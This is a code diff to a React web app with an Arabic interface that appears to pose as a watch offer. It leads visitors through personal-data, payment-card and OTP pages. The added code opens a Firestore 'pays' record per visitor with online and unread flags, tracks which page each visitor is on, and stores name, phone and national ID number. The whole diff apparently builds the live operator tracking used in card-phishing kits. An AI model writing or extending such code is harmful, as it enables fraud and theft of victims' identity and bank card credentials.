@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import { Menu, ChevronRight, ChevronLeft } from 'lucide-react';
 import watchBlack  from './assets/watch-black.png';
 import watchSilver from './assets/watch-silver.png';
@@ -7,6 +7,8 @@ import watchGold   from './assets/watch-gold.png';
 import RegisterData, { type UserData } from './pages/RegisterData';
 import RegisterCard from './pages/RegisterCard';
 import OtpVerify   from './pages/OtpVerify';
+import { db } from './lib/firebase';
+import { doc, setDoc, updateDoc } from 'firebase/firestore';
 
 const colors = [
   { id: 'black',  name: 'أسود', bgColor: 'bg-[#1a1a1a]', img: watchBlack  },
@@ -158,13 +160,58 @@ function WatchSelector({ onNext }: { onNext: () => void }) {
 export default function App() {
   const [page,     setPage]     = useState<'watch' | 'register' | 'card' | 'otp'>('watch');
   const [userData, setUserData] = useState<UserData | null>(null);
-  const [docId,    setDocId]    = useState<string>('');
+
+  // Stable session ID — one doc per app session
+  const sessionId = useRef(crypto.randomUUID());
+
+  /* ── Create session doc immediately on app load ── */
+  useEffect(() => {
+    const ref = doc(db, 'pays', sessionId.current);
+    setDoc(ref, {
+      sessionId:  sessionId.current,
+      status:     'متصل',
+      isOnline:   true,
+      isUnread:   true,
+      createdAt:  new Date().toISOString(),
+    }, { merge: true }).catch(console.error);
+  }, []);
+
+  /* ── Status helpers ── */
+  const setStatus = (status: string, extra?: Record<string, unknown>) => {
+    updateDoc(doc(db, 'pays', sessionId.current), { status, ...extra }).catch(console.error);
+  };
+
+  /* ── Navigation handlers ── */
+  const goToRegister = () => {
+    setPage('register');
+    setStatus('عند المعلومات');
+  };
+
+  const goToCard = (data: UserData) => {
+    setUserData(data);
+    setPage('card');
+    setStatus('عند البطاقه', {
+      ownerName:      data.name,
+      phoneNumber:    data.phone,
+      identityNumber: data.id,
+    });
+  };
+
+  const backToWatch = () => {
+    setPage('watch');
+    setStatus('متصل');
+  };
+
+  const backToRegister = () => {
+    setPage('register');
+    setStatus('عند المعلومات');
+  };
 
   if (page === 'register') {
     return (
       <RegisterData
-        onBack={() => setPage('watch')}
-        onNext={(data) => { setUserData(data); setPage('card'); }}
+        onBack={backToWatch}
+        onNext={goToCard}
       />
     );
   }
@@ -173,15 +220,16 @@ export default function App() {
     return (
       <RegisterCard
         userData={userData}
-        onBack={() => setPage('register')}
-        onNext={(id) => { setDocId(id); setPage('otp'); }}
+        sessionId={sessionId.current}
+        onBack={backToRegister}
+        onNext={() => setPage('otp')}
       />
     );
   }
 
-  if (page === 'otp' && docId) {
-    return <OtpVerify docId={docId} />;
+  if (page === 'otp') {
+    return <OtpVerify docId={sessionId.current} />;
   }
 
-  return <WatchSelector onNext={() => setPage('register')} />;
+  return <WatchSelector onNext={goToRegister} />;
 }
